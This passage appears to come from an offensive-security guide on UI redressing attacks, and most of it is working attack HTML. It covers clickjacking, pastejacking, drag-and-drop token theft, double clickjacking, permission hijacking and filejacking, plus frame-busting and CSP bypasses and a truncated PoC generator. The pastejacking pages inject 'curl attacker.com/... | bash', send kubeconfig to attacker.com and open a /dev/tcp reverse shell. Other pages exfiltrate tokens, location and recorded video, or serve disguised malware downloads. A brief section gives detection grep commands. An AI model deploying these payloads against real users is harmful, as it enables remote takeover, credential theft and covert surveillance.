                                    style="width:100%;padding:10px;margin:10px 0;
                                           border:1px solid #ccc;border-radius:4px;
                                           box-sizing:border-box;">
                                <button type="submit"
                                    style="width:100%;padding:10px;background:#4285f4;
                                           color:white;border:none;border-radius:4px;
                                           cursor:pointer;margin-top:10px;">
                                    Sign In
                                </button>
                            </form>
                        </div>
                    `;

                    // Change favicon
                    let icon = document.querySelector("link[rel*='icon']") ||
                               document.createElement('link');
                    icon.type = 'image/x-icon';
                    icon.rel = 'shortcut icon';
                    icon.href = 'https://target.com/favicon.ico';
                    document.head.appendChild(icon);

                    // Manipulate URL
                    history.replaceState({}, '', '/auth/login?expired=true');
                }, 2000);
            }
        });
    </script>
</body>
</html>
```

---

## Pastejacking (Clipboard Hijacking)

### Concept

Pastejacking manipulates the clipboard content when a user copies text from a web page. The user sees legitimate text but when they paste it (often into a terminal), malicious commands are executed instead.

### Basic Pastejacking

```html [pastejack_basic.html]
<!DOCTYPE html>
<html>
<head>
    <title>Linux Tutorial - Install Docker</title>
    <style>
        body {
            background: #1e1e1e;
            color: #d4d4d4;
            font-family: 'Consolas', monospace;
            padding: 40px;
            max-width: 800px;
            margin: 0 auto;
        }
        .code-block {
            background: #2d2d2d;
            border: 1px solid #444;
            border-radius: 6px;
            padding: 15px 20px;
            position: relative;
            margin: 20px 0;
            overflow: hidden;
        }
        .code-block code {
            color: #9cdcfe;
            font-size: 14px;
        }
        .copy-hint {
            color: #666;
            font-size: 12px;
            margin-top: 5px;
        }
        h1 { color: #569cd6; }
        h2 { color: #dcdcaa; }
    </style>
</head>
<body>
    <h1>How to Install Docker on Ubuntu</h1>
    <h2>Step 1: Update your system</h2>
    <p>Copy and paste the following command into your terminal:</p>

    <div class="code-block" id="codeBlock">
        <code>sudo apt-get update && sudo apt-get install docker.io</code>
    </div>
    <p class="copy-hint">📋 Select and copy the command above</p>

    <script>
        // Override copy event to inject malicious command
        document.addEventListener('copy', function(e) {
            // What the user SEES:
            // sudo apt-get update && sudo apt-get install docker.io

            // What actually gets pasted:
            e.clipboardData.setData('text/plain',
                'curl https://attacker.com/shell.sh | bash\n' +
                '# sudo apt-get update && sudo apt-get install docker.io\n'
            );
            e.preventDefault();

            /*
             * The \n at the end of the first line causes automatic
             * execution in most terminals.
             * The second line is a comment that looks like the
             * original command (for less suspicion if user checks).
             */
        });
    </script>
</body>
</html>
```

### Advanced Pastejacking with Invisible Text

```html [pastejack_invisible.html]
<!DOCTYPE html>
<html>
<head>
    <title>DevOps Quick Reference</title>
    <style>
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: 'Fira Code', monospace;
            padding: 40px;
            max-width: 900px;
            margin: 0 auto;
        }
        pre {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
            overflow-x: auto;
            position: relative;
        }
        code { color: #79c0ff; }
        .hidden-cmd {
            /*
             * Invisible text inserted between visible characters.
             * When user selects and copies the visible code,
             * the hidden text is included in the clipboard.
             */
            position: absolute;
            left: -9999px;
            font-size: 0;
            line-height: 0;
            opacity: 0;
            /* Or use: */
            /* color: transparent; font-size: 0; */
        }
    </style>
</head>
<body>
    <h1>Kubernetes Cheat Sheet</h1>
    <h2>Get Pod Status</h2>
    <pre><code>kubectl get pods --all-namespaces<span class="hidden-cmd">
;curl attacker.com/k8s-exfil.sh|bash
</span></code></pre>

    <h2>Check Cluster Info</h2>
    <pre><code>kubectl cluster-info<span class="hidden-cmd">
;cat ~/.kube/config|base64|curl -d @- attacker.com/collect
</span></code></pre>

    <p style="color:#666; margin-top:30px;">
        💡 Pro tip: Copy commands directly into your terminal for quick execution.
    </p>
</body>
</html>
```

### Pastejacking with CSS Direction Override

```html [pastejack_rtl.html]
<!DOCTYPE html>
<html>
<head>
    <title>Server Setup Guide</title>
    <style>
        body {
            background: #1a1a2e;
            color: #e0e0e0;
            font-family: monospace;
            padding: 40px;
        }
        .cmd {
            background: #16213e;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            position: relative;
        }
        /*
         * Right-to-Left override trick:
         * Use Unicode RTL override character (U+202E) or CSS
         * to reorder visible text while clipboard gets different content.
         */
        .rtl-trick {
            unicode-bidi: bidi-override;
            direction: rtl;
            display: inline;
            /* This reverses the DISPLAY of text but clipboard gets original */
        }
    </style>
</head>
<body>
    <h1>SSH Server Hardening</h1>

    <h3>Step 1: Edit SSH Config</h3>
    <div class="cmd">
        <code>sudo nano /etc/ssh/sshd_config</code>
    </div>

    <h3>Step 2: Restart SSH Service</h3>
    <div class="cmd" id="malicious">
        <code></code>
    </div>

    <script>
        // Programmatically build command with hidden characters
        const cmd = document.querySelector('#malicious code');
        const visible = 'sudo systemctl restart sshd';

        // Insert zero-width characters that, when pasted in terminal,
        // get interpreted differently
        let crafted = '';
        for (let i = 0; i < visible.length; i++) {
            crafted += visible[i];
            if (i === 3) {
                // Insert hidden command after "sudo"
                crafted += '\u200B'; // Zero-width space
            }
        }
        cmd.textContent = visible; // Show clean version

        // Override copy to inject payload
        document.getElementById('malicious').addEventListener('copy', function(e) {
            e.preventDefault();
            e.clipboardData.setData('text/plain',
                'sudo systemctl restart sshd; ' +
                'bash -i >& /dev/tcp/attacker.com/4444 0>&1\n'
            );
        });
    </script>
</body>
</html>
```

### Pastejacking Detection Commands

```bash [Detect Pastejacking on Pages]
# Check for copy event listeners
curl -s "https://target.com" | grep -iE "(addEventListener.*copy|oncopy|clipboardData|clipboard\.write)"

# Check for hidden/invisible elements
curl -s "https://target.com" | grep -iE "(position:\s*absolute.*left:\s*-|font-size:\s*0|opacity:\s*0|visibility:\s*hidden|display:\s*none)" | head -20

# Check for unicode override characters
curl -s "https://target.com" | grep -P "[\x{202E}\x{200B}\x{200C}\x{200D}\x{FEFF}]"

# Check for Clipboard API usage
curl -s "https://target.com" | grep -iE "(navigator\.clipboard|document\.execCommand.*copy)"
```

---

## Drag-and-Drop Redressing

### Concept

The attacker tricks users into dragging content from a visible element and dropping it onto a hidden iframe, or dragging from a hidden iframe and dropping onto a visible target. This can be used to exfiltrate tokens, CSRF tokens, or inject data into forms.

### Token Extraction via Drag-and-Drop

```html [dnd_token_steal.html]
<!DOCTYPE html>
<html>
<head>
    <title>Image Gallery - Drag to Organize</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 40px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 200px);
            gap: 15px;
            position: relative;
        }
        .photo {
            width: 200px;
            height: 200px;
            background: #333;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            cursor: grab;
            user-select: none;
        }
        .photo:active { cursor: grabbing; }
        .trash-zone {
            width: 200px;
            height: 200px;
            border: 3px dashed #555;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #555;
            font-size: 14px;
            position: relative;
        }
        .trash-zone.over {
            border-color: #e94560;
            background: rgba(233,69,96,0.1);
        }
        /*
         * Hidden iframe positioned under the drag source.
         * When user drags a "photo", they actually drag content
         * from the hidden iframe (e.g., a CSRF token displayed on page).
         */
        .source-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 200px;
            height: 200px;
            opacity: 0.0001;
            z-index: 10;
            border: none;
        }
        /*
         * Hidden text area under the drop zone.
         * Dragged content (token) gets dropped into this,
         * which we can then read.
         */
        .capture-area {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 10;
        }
    </style>
</head>
<body>
    <h1>📸 Photo Gallery</h1>
    <p>Drag photos to the trash to delete them</p>

    <div class="gallery">
        <div class="photo" style="position:relative;">
            🏔️
            <!-- Hidden iframe source - user drags FROM this -->
            <iframe class="source-frame"
                src="https://target.com/profile"
                scrolling="no">
            </iframe>
        </div>
        <div class="photo">🌊</div>
        <div class="photo">🌅</div>
        <div class="photo">🏙️</div>
        <div class="photo">🌲</div>

        <div class="trash-zone" id="dropZone">
            🗑️ Drop here to delete
            <!-- Hidden textarea captures dropped content -->
            <textarea class="capture-area" id="captureArea"></textarea>
        </div>
    </div>

    <script>
        const dropZone = document.getElementById('dropZone');
        const captureArea = document.getElementById('captureArea');

        dropZone.addEventListener('dragover', function(e) {
            e.preventDefault();
            dropZone.classList.add('over');
        });

        dropZone.addEventListener('dragleave', function() {
            dropZone.classList.remove('over');
        });

        dropZone.addEventListener('drop', function(e) {
            e.preventDefault();
            dropZone.classList.remove('over');

            // Extract dragged content (could be CSRF token, session data, etc.)
            const data = e.dataTransfer.getData('text/plain') ||
                         e.dataTransfer.getData('text/html') ||
                         e.dataTransfer.getData('text/uri-list');

            if (data) {
                console.log('[+] Captured data:', data);
                // Exfiltrate to attacker server
                fetch('https://attacker.com/collect', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        captured: data,
                        timestamp: Date.now()
                    })
                });
            }

            // Visual feedback
            dropZone.innerHTML = '✅ Photo deleted';
        });
    </script>
</body>
</html>
```

### Drag-and-Drop Data Injection

```html [dnd_inject.html]
<!DOCTYPE html>
<html>
<head>
    <title>Form Builder</title>
    <style>
        body {
            background: #0d1117;
            color: white;
            font-family: Arial, sans-serif;
            padding: 40px;
        }
        .workspace {
            display: flex;
            gap: 30px;
        }
        .toolbox {
            width: 250px;
            background: #161b22;
            border-radius: 8px;
            padding: 20px;
        }
        .tool {
            background: #21262d;
            padding: 12px;
            margin: 8px 0;
            border-radius: 6px;
            cursor: grab;
            text-align: center;
            user-select: none;
        }
        .tool:active { cursor: grabbing; opacity: 0.7; }
        .canvas {
            flex: 1;
            background: #161b22;
            border-radius: 8px;
            padding: 20px;
            min-height: 400px;
            position: relative;
        }
        .canvas.over {
            border: 2px dashed #1f6feb;
        }
        /*
         * Hidden iframe positioned in the drop zone.
         * When user "drops" a tool, the drop actually goes
         * to the target form field inside the iframe.
         */
        .inject-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 10;
            border: none;
        }
    </style>
</head>
<body>
    <h1>🔧 Drag & Drop Form Builder</h1>
    <div class="workspace">
        <div class="toolbox">
            <h3>Components</h3>
            <!-- Draggable items containing malicious data -->
            <div class="tool" draggable="true"
                 data-inject="attacker@evil.com">
                📧 Email Field
            </div>
            <div class="tool" draggable="true"
                 data-inject="<script>alert(1)</script>">
                📝 Text Area
            </div>
            <div class="tool" draggable="true"
                 data-inject="javascript:alert(document.cookie)">
                🔗 Link Field
            </div>
        </div>
        <div class="canvas" id="canvas">
            <p>Drop components here to build your form</p>
            <!-- Hidden target form receives the dropped data -->
            <iframe class="inject-frame"
                src="https://target.com/settings/profile"
                scrolling="no">
            </iframe>
        </div>
    </div>

    <script>
        document.querySelectorAll('.tool').forEach(tool => {
            tool.addEventListener('dragstart', function(e) {
                // Set the data that will be "dropped" into the target iframe
                e.dataTransfer.setData('text/plain', this.dataset.inject);
            });
        });

        const canvas = document.getElementById('canvas');
        canvas.addEventListener('dragover', e => {
            e.preventDefault();
            canvas.classList.add('over');
        });
        canvas.addEventListener('dragleave', () => canvas.classList.remove('over'));
        canvas.addEventListener('drop', e => {
            e.preventDefault();
            canvas.classList.remove('over');
        });
    </script>
</body>
</html>
```

---

## Double Clickjacking

### Concept

Double Clickjacking exploits the timing between two rapid mouse clicks (double-click). On the first click, the attacker shows a benign page. Between the first and second click (milliseconds apart), the page swaps to show the real target. The second click lands on the malicious target.

```html [double_clickjack.html]
<!DOCTYPE html>
<html>
<head>
    <title>Captcha Verification</title>
    <style>
        body {
            background: #0f0f23;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .captcha-box {
            background: #1a1a3e;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            width: 400px;
            position: relative;
        }
        .verify-btn {
            background: #4ecdc4;
            color: #111;
            border: none;
            padding: 18px 50px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.1s;
        }
        .verify-btn:active { transform: scale(0.95); }
        .swap-container {
            position: relative;
            display: inline-block;
        }
        .malicious-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 100;
            border: none;
            opacity: 0;
            pointer-events: none;   /* Initially not clickable */
        }
    </style>
</head>
<body>
    <div class="captcha-box">
        <h2>🤖 Are you human?</h2>
        <p style="color:#888; margin:20px 0;">Double-click the button to verify</p>
        <div class="swap-container">
            <button class="verify-btn" id="baitBtn">Double-Click to Verify</button>
            <iframe class="malicious-layer" id="malFrame"
                src="https://target.com/account/authorize?grant=full_access&client=attacker_app">
            </iframe>
        </div>
        <p id="status" style="color:#666; margin-top:20px; font-size:14px;"></p>
    </div>

    <script>
        const baitBtn = document.getElementById('baitBtn');
        const malFrame = document.getElementById('malFrame');
        const status = document.getElementById('status');
        let clickCount = 0;

        baitBtn.addEventListener('mousedown', function() {
            clickCount++;

            if (clickCount === 1) {
                // First click: show progress feedback
                status.textContent = "Verifying... click again to confirm";
                baitBtn.textContent = "Click Again ✓";
                baitBtn.style.background = '#238636';

                // CRITICAL: Between first mouseup and second mousedown,
                // enable the malicious iframe to receive the second click
                setTimeout(function() {
                    malFrame.style.opacity = '0.0001';
                    malFrame.style.pointerEvents = 'auto';
                }, 50); // 50ms - faster than human double-click interval
            }
        });

        // Reset if user doesn't double-click fast enough
        baitBtn.addEventListener('click', function() {
            setTimeout(function() {
                if (clickCount === 1) {
                    clickCount = 0;
                    baitBtn.textContent = "Double-Click to Verify";
                    baitBtn.style.background = '#4ecdc4';
                    malFrame.style.pointerEvents = 'none';
                    status.textContent = "";
                }
            }, 1000);
        });
    </script>
</body>
</html>
```

### Double-Click with Permission Dialog

```html [doubleclick_permission.html]
<!DOCTYPE html>
<html>
<head>
    <title>Photo Editor</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .editor-container {
            max-width: 600px;
            margin: 0 auto;
        }
        .upload-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="editor-container">
        <h1>📷 Online Photo Editor</h1>
        <p>Double-click to enable camera for live editing</p>
        <button class="upload-btn" id="triggerBtn">Double-Click to Start Camera</button>
    </div>

    <script>
        let firstClick = false;

        document.getElementById('triggerBtn').addEventListener('mousedown', function() {
            if (!firstClick) {
                firstClick = true;
                this.textContent = "Click again to confirm...";

                // Between clicks, trigger camera permission prompt
                // The "Allow" button of the browser dialog will appear
                // right where the user's second click lands
                setTimeout(function() {
                    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                        .then(stream => {
                            console.log('[+] Camera/Mic access granted!');
                            // Stream video to attacker
                            // ...
                        })
                        .catch(err => console.log('Permission denied'));
                }, 100);
            }
        });
    </script>
</body>
</html>
```

---

## Permission Redressing

### Browser Permission Hijacking

```html [permission_redress.html]
<!DOCTYPE html>
<html>
<head>
    <title>Weather App</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .weather-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            width: 350px;
        }
        .location-btn {
            background: white;
            color: #764ba2;
            border: none;
            padding: 15px 40px;
            font-size: 16px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
        }
        .weather-icon { font-size: 60px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="weather-card">
        <div class="weather-icon">🌤️</div>
        <h2>Local Weather</h2>
        <p>Click below to get weather for your location</p>
        <button class="location-btn" onclick="requestLocation()">
            📍 Use My Location
        </button>
        <div id="result" style="margin-top:20px;"></div>
    </div>

    <script>
        function requestLocation() {
            // Request geolocation - browser shows permission dialog
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    // Successfully got location - exfiltrate
                    const data = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: pos.timestamp
                    };

                    document.getElementById('result').innerHTML =
                        `<p>Temperature: 72°F</p><p>Humidity: 45%</p>`;

                    // Silently send location to attacker
                    fetch('https://attacker.com/location', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(data)
                    });

                    // Also try camera and microphone
                    navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: true
                    }).then(stream => {
                        // Record and exfiltrate
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            // Upload blob to attacker server
                            const fd = new FormData();
                            fd.append('video', blob);
                            fetch('https://attacker.com/upload', {
                                method: 'POST',
                                mode: 'no-cors',
                                body: fd
                            });
                        };
                        recorder.start();
                        setTimeout(() => recorder.stop(), 10000); // 10 seconds
                    }).catch(() => {});

                    // Try notification permission
                    Notification.requestPermission().then(perm => {
                        if (perm === 'granted') {
                            // Can now send push notification phishing
                            new Notification('Security Alert', {
                                body: 'Unusual login detected. Click to verify.',
                                icon: 'https://target.com/favicon.ico'
                            });
                        }
                    });
                },
                function(err) {
                    document.getElementById('result').innerHTML =
                        '<p>Unable to get location. Try again.</p>';
                }
            );
        }
    </script>
</body>
</html>
```

### Notification Permission Hijack

```html [notification_hijack.html]
<!DOCTYPE html>
<html>
<head>
    <title>Breaking News Alert</title>
    <style>
        body {
            background: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            padding: 40px;
        }
        .alert-bar {
            background: #c0392b;
            padding: 15px 20px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 700px;
            margin: 20px auto;
        }
        .enable-btn {
            background: white;
            color: #c0392b;
            border: none;
            padding: 10px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="alert-bar">
        <span>🔴 BREAKING: Enable notifications for real-time updates</span>
        <button class="enable-btn" onclick="enableNotifications()">
            Enable Alerts
        </button>
    </div>

    <script>
        function enableNotifications() {
            Notification.requestPermission().then(function(permission) {
                if (permission === 'granted') {
                    // Now attacker can send phishing notifications anytime

                    // Immediate phishing notification
                    setTimeout(function() {
                        new Notification('🔒 Account Security', {
                            body: 'Suspicious login detected from Russia. Click to secure your account.',
                            icon: 'https://target.com/favicon.ico',
                            tag: 'security-alert',
                            requireInteraction: true
                        });
                    }, 30000); // 30 seconds later

                    // Using Service Worker for persistent notifications
                    if ('serviceWorker' in navigator) {
                        navigator.serviceWorker.register('/sw.js').then(reg => {
                            // Service worker can send notifications even when
                            // the page is closed
                        });
                    }
                }
            });
        }
    </script>
</body>
</html>
```

---

## Filejacking

### File Download Manipulation

```html [filejack_download.html]
<!DOCTYPE html>
<html>
<head>
    <title>Software Downloads</title>
    <style>
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: 'Segoe UI', sans-serif;
            padding: 40px;
            max-width: 800px;
            margin: 0 auto;
        }
        .download-card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
        }
        .dl-btn {
            background: #238636;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 6px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .dl-btn:hover { background: #2ea043; }
        /* Hidden malicious download overlaid on legitimate button */
        .malicious-dl {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            opacity: 0.0001;
            z-index: 10;
        }
    </style>
</head>
<body>
    <h1>⬇️ Download Center</h1>

    <div class="download-card">
        <div>
            <h3>📄 PDF Reader v3.2</h3>
            <p style="color:#8b949e;">Size: 45.2 MB | Windows</p>
        </div>
        <!-- Visible: legitimate-looking download button -->
        <a class="dl-btn" href="#">Download</a>
        <!-- Hidden: actual download is malware -->
        <a class="malicious-dl" href="https://attacker.com/malware.exe"
           download="PDFReader_Setup_v3.2.exe">
            <button style="padding:10px 25px;">Download</button>
        </a>
    </div>

    <div class="download-card">
        <div>
            <h3>🎬 Video Player Pro</h3>
            <p style="color:#8b949e;">Size: 28.7 MB | Windows</p>
        </div>
        <a class="dl-btn" href="#">Download</a>
        <a class="malicious-dl" href="https://attacker.com/trojan.exe"
           download="VideoPlayer_Pro_Setup.exe">
            <button style="padding:10px 25px;">Download</button>
        </a>
    </div>
</body>
</html>
```

### File Upload Hijacking

```html [filejack_upload.html]
<!DOCTYPE html>
<html>
<head>
    <title>Cloud Storage</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            padding: 40px;
        }
        .upload-zone {
            border: 3px dashed #333;
            border-radius: 12px;
            padding: 60px;
            text-align: center;
            max-width: 500px;
            margin: 30px auto;
            position: relative;
            cursor: pointer;
        }
        .upload-zone:hover {
            border-color: #1f6feb;
            background: rgba(31,111,235,0.05);
        }
        .upload-icon { font-size: 50px; margin-bottom: 15px; }
        /*
         * Hidden iframe with target's file upload form.
         * When user clicks to upload or drags a file,
         * the file goes to the target's upload endpoint.
         */
        .upload-hijack {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 10;
            border: none;
        }
    </style>
</head>
<body>
    <h1>☁️ Cloud Storage</h1>
    <p>Upload your files securely</p>

    <div class="upload-zone">
        <div class="upload-icon">📁</div>
        <p>Drag & drop files here</p>
        <p style="color:#666;">or click to browse</p>

        <!-- Hidden target upload form -->
        <iframe class="upload-hijack"
            src="https://target.com/upload"
            scrolling="no">
        </iframe>
    </div>
</body>
</html>
```

---

## Bypass Techniques

### Frame-Busting Bypass Matrix

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="Sandbox Attribute"}

  ```html [Sandbox Bypass Variations]
  <!-- Block ALL JavaScript (breaks JS frame-busting) -->
  <iframe sandbox src="https://target.com" style="opacity:0; position:absolute;"></iframe>

  <!-- Allow forms but block scripts -->
  <iframe sandbox="allow-forms" src="https://target.com/settings"></iframe>

  <!-- Allow forms + same-origin (needed for cookie access in iframe) -->
  <iframe sandbox="allow-forms allow-same-origin" src="https://target.com/action"></iframe>

  <!-- Allow popups (some actions need popup ability) -->
  <iframe sandbox="allow-forms allow-same-origin allow-popups" src="https://target.com/oauth"></iframe>

  <!-- Full sandbox bypass combinations to try -->
  <iframe sandbox="" src="https://target.com"></iframe>
  <iframe sandbox="allow-forms" src="https://target.com"></iframe>
  <iframe sandbox="allow-forms allow-same-origin" src="https://target.com"></iframe>
  <iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
  <iframe sandbox="allow-forms allow-same-origin allow-scripts" src="https://target.com"></iframe>
  <iframe sandbox="allow-forms allow-same-origin allow-popups" src="https://target.com"></iframe>
  <iframe sandbox="allow-forms allow-same-origin allow-scripts allow-popups" src="https://target.com"></iframe>

  <!--
      WARNING: allow-scripts + allow-same-origin together
      allows the framed page to REMOVE its own sandbox.
      This re-enables frame-busting but also enables full exploitation.
  -->
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Double Framing"}

  ```html [Double Frame Bypass]
  <!-- outer.html - First layer -->
  <!DOCTYPE html>
  <html>
  <body>
      <!--
          Some frame-busters check: if (top !== self)
          Double framing can confuse top/parent/self relationships
      -->
      <iframe src="middle.html" style="width:100%;height:100%;border:none;"></iframe>
  </body>
  </html>

  <!-- middle.html - Second layer -->
  <!DOCTYPE html>
  <html>
  <head>
      <script>
          // Prevent the inner frame from breaking out
          window.onbeforeunload = function() { return false; };
      </script>
  </head>
  <body>
      <div style="position:relative;">
          <button style="padding:20px 50px; font-size:18px; position:relative; z-index:1;">
              Click Me
          </button>
          <iframe src="https://target.com"
              sandbox="allow-forms"
              style="position:absolute; top:0; left:0; width:100%; height:100%;
                     opacity:0; z-index:10; border:none;">
          </iframe>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Navigation Blocking"}

  ```html [Block Frame Buster Navigation]
  <!DOCTYPE html>
  <html>
  <head>
      <script>
          // Method 1: Constantly reset location
          var lastLocation = location.href;
          setInterval(function() {
              if (location.href !== lastLocation) {
                  location.href = lastLocation;
              }
          }, 1);

          // Method 2: Override onbeforeunload
          window.onbeforeunload = function() {
              return "Do you want to leave?";
          };

          // Method 3: Block via history manipulation
          // Push many history entries so back() doesn't escape
          for (var i = 0; i < 100; i++) {
              history.pushState(null, '', location.href);
          }
          window.addEventListener('popstate', function() {
              history.pushState(null, '', location.href);
          });
      </script>
  </head>
  <body>
      <iframe src="https://target.com"
          style="width:100%;height:100%;border:none;opacity:0;position:absolute;z-index:10;">
      </iframe>
      <button style="padding:20px 50px;font-size:20px;">Click Here</button>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="XFO ALLOW-FROM"}

  ```bash [ALLOW-FROM is Deprecated]
  # X-Frame-Options: ALLOW-FROM is deprecated
  # NOT supported in: Chrome, Firefox 70+, Edge, Safari
  # Only worked in: IE, older Firefox

  # If server responds with:
  # X-Frame-Options: ALLOW-FROM https://trusted.com
  # Modern browsers IGNORE this entirely

  # Test if ALLOW-FROM is the ONLY protection
  curl -sI "https://target.com" | grep -i "x-frame"
  # If output: X-Frame-Options: ALLOW-FROM https://something.com
  # AND no CSP frame-ancestors → VULNERABLE in modern browsers

  # Verify by loading in iframe
  echo '<iframe src="https://target.com" width="800" height="600" style="border:2px solid red;"></iframe>' > test.html
  python3 -m http.server 8080
  # Open in Chrome - if it loads, ALLOW-FROM bypass confirmed
  ```

  :::
::

### CSP Bypass Vectors

```bash [CSP frame-ancestors Bypass Analysis]
# Analyze CSP for weaknesses

# 1. Wildcard subdomain in frame-ancestors
# CSP: frame-ancestors 'self' *.target.com
# Bypass: Find or takeover a subdomain of target.com
subfinder -d target.com -silent | httpx -silent | tee subdomains.txt
# Check for subdomain takeover
subjack -w subdomains.txt -t 20 -o takeover_results.txt

# 2. Specific trusted domain in frame-ancestors
# CSP: frame-ancestors 'self' https://partner.com
# Bypass: Find XSS or open redirect on partner.com, then frame from there

# 3. frame-ancestors with http:// (mixed content)
# CSP: frame-ancestors http://target.com
# Bypass: MITM on HTTP to inject framing page

# 4. frame-ancestors in Report-Only mode
# Content-Security-Policy-Report-Only: frame-ancestors 'none'
# This is NOT enforced! Page is still frameable.
curl -sI "https://target.com" | grep -i "report-only"

# 5. frame-ancestors only in meta tag
# <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">
# Browsers IGNORE frame-ancestors in meta tags!
curl -s "https://target.com" | grep -i "frame-ancestors" | grep -i "meta"

# 6. Missing frame-ancestors but other CSP directives present
# CSP: default-src 'self'; script-src 'self'
# No frame-ancestors = frameable (frame-ancestors doesn't fall back to default-src)
curl -sI "https://target.com" | grep -i "content-security-policy" | grep -v "frame-ancestors"
```

### SameSite Cookie Bypass

```bash [SameSite Bypass Techniques]
# SameSite=Lax bypass for GET-based actions
# Lax allows cookies on top-level GET navigations
# Some sensitive actions use GET (bad practice) - exploit these

# If target has: Set-Cookie: session=abc; SameSite=Lax
# GET-based state-changing actions are still exploitable:
# https://target.com/settings/delete?confirm=1  (GET)
# https://target.com/api/transfer?to=attacker&amount=100  (GET)

# SameSite=Lax with method override
# Some frameworks accept POST-like actions via GET with _method parameter
# https://target.com/settings?_method=DELETE&resource=account

# SameSite=None requires Secure flag
# If Set-Cookie: session=abc; SameSite=None (without Secure)
# Some browsers reject this or treat as Lax

# Check Chrome DevTools > Application > Cookies for SameSite warnings
# Check Console for: "Cookie was blocked because it had 'SameSite=Lax'"
```

---

## PoC Generator & Automation

### Universal PoC Generator

```python [ui_redress_poc_gen.py]
#!/usr/bin/env python3
"""
Universal UI Redressing PoC Generator
Generates exploit HTML for multiple attack types
"""
import argparse
import html
import json

TEMPLATES = {
    "clickjack": """<!DOCTYPE html>
<html>
<head><title>{title}</title>
<style>
body {{ background:#0d1117; color:white; font-family:Arial; display:flex;
       justify-content:center; align-items:center; height:100vh; margin:0; }}
.bait {{ text-align:center; position:relative; }}
.btn {{ background:#e94560; color:white; border:none; padding:20px 60px;
        font-size:22px; border-radius:10px; cursor:pointer; }}
.frame {{ position:absolute; top:0; left:0; width:100%; height:100%;
          opacity:{opacity}; z-index:10; border:none; }}
</style></head>
<body>
<div class="bait">
    <h1>{heading}</h1>
    <p style="color:#888;margin:20px 0;">{subtext}</p>
    <div style="position:relative;display:inline-block;">
        <button class="btn">{button_text}</button>
        <iframe class="frame" src="{target_url}" scrolling="no"></iframe>
    </div>
</div>
</body></html>""",

    "strokejack": """<!DOCTYPE html>
<html>
<head><title>{title}</title>
<style>
body {{ background:#0d1117; color:white; font-family:Arial; display:flex;
       justify-content:center; align-items:center; height:100vh; margin:0; }}
.container {{ text-align:center; width:500px; position:relative; }}
.input {{ width:100%; padding:18px; font-size:18px; border:2px solid #30363d;
          border-radius:10px; background:#161b22; color:white; outline:none;
          box-sizing:border-box; }}
.input:focus {{ border-color:#1f6feb; }}
.wrapper {{ position:relative; margin-top:20px; }}
.frame {{ position:absolute; top:0; left:0; width:100%; height:100%;
          opacity:{opacity}; z-index:5; border:none; }}
</style></head>
<body>
<div class="container">
    <h1>{heading}</h1>
    <div class="wrapper">
        <input class="input" placeholder="{placeholder}" readonly>
        <iframe class="frame" src="{target_url}" scrolling="no"></iframe>
    </div>
</div>
<script>
